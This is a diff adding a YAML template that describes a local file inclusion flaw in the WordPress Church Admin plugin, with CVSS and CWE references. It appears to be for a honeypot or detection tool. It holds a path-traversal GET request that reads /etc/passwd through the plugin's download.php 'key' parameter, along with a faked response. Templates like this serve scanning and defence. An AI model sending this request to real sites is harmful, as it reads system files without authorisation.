@@ -1,0 +1,27 @@
+id: church-admin-lfi
+info:
+  name: WordPress Church Admin 0.33.2.1 - Local File Inclusion
+  author: 0x_Akoko
+  description: WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion
+    via the "key" parameter of plugins/church-admin/display/download.php.
+  severity: high
+  reference:
+  - https://wpscan.com/vulnerability/8997
+  - https://id.wordpress.org/plugins/church-admin/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: wordpress,wp-plugin,lfi,wpscan
+traps:
+- request:
+    method: GET
+    path: /wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
